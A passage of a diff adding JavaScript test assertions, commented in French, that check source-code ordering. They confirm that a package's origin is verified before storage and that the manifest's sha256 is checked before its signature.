+    const iV = cm.indexOf('const origine = K.verdictOrigine(');
+    const iS = cm.indexOf('const dest = getStore().storePack(');
+    assert.ok(iV > 0 && iS > 0 && iV < iS, 'on vérifie l\'origine AVANT de ranger le paquet');
+    // Et le verdict est RANGÉ avec le paquet : un verdict qui vit deux secondes n'est pas un
+    // verdict (règle 6.8.1).
+    assert.ok(/origine: \{ etat: origine\.etat/.test(cm));
+    // L'ordre des deux contrôles est fixé : le sha256 d'abord, pour la bonne phrase.
+    const zc = lireSource('src', 'zip.js');
+    const vz = zc.slice(zc.indexOf('function verifyManifest'), zc.indexOf('function publicKeyFrom'));
+    assert.ok(vz.indexOf('manifeste-modifie') < vz.indexOf('signature-fausse'),
+      'le sha256 du manifeste se contrôle AVANT la signature : les deux phrases ne demandent pas le même coup de téléphone');
+  });
 
   if (enCours) throw new Error(`${enCours} test(s) asynchrone(s) lancé(s) sans « await ta(…) » : ils ne peuvent plus échouer`);
   console.log(`\n${n} tests OK`);
